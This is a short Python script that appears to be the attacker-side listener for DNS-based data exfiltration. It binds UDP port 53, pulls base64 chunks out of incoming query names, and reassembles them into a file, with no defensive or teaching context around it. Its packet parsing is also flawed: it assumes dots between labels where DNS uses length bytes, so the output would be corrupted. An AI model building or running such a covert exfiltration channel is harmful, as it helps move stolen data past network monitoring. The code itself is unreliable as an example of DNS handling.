
import socket
import base64

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("0.0.0.0", 53))

print("[+] Receiving data via DNS...")

data_parts = []

try:
    while True:
        data, addr = s.recvfrom(1024)
        query = data.hex()

        try:
            # Extract the DNS name field more robustly
            domain = data[13:].split(b'\x00')[0].decode(errors='ignore')
            part = domain.replace('.', '')  # Assumes base64 chunks split with dot labels
            print(f"Received chunk: {part}")
            data_parts.append(part)
        except Exception as e:
            print(f"Error decoding part: {e}")
            continue

except KeyboardInterrupt:
    print("[*] KeyboardInterrupt detected. Writing file...")

finally:
    full_data = ''.join(data_parts)

    try:
        decoded = base64.b64decode(full_data)
        with open("output.txt", "wb") as f:
            f.write(decoded)
        print("[+] File reconstructed and saved as output.txt")
    except Exception as e:
        print(f"[-] Failed to decode/write file: {e}")
